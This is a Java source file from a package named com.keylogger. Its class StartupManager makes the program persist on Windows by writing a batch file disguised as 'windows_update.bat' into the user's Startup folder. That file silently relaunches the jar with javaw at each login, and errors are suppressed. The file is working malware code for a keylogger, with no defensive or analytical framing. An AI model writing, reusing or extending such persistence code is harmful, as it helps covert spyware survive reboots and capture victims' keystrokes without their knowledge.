package com.keylogger;

import java.io.File;
import java.io.FileWriter;

public class StartupManager {
    
    public static void addToStartup() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                addToWindowsStartup();
            }
        } catch (Exception e) {
        }
    }
    
    private static void addToWindowsStartup() throws Exception {
        String jarPath = getJarPath();
        String startupDir = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        String batPath = startupDir + "\\windows_update.bat";
        
        String batContent = "@echo off\nstart javaw -jar \"" + jarPath + "\"";
        
        try (FileWriter writer = new FileWriter(batPath)) {
            writer.write(batContent);
        }
    }
    
    private static String getJarPath() throws Exception {
        return new File(StartupManager.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getPath();
    }
}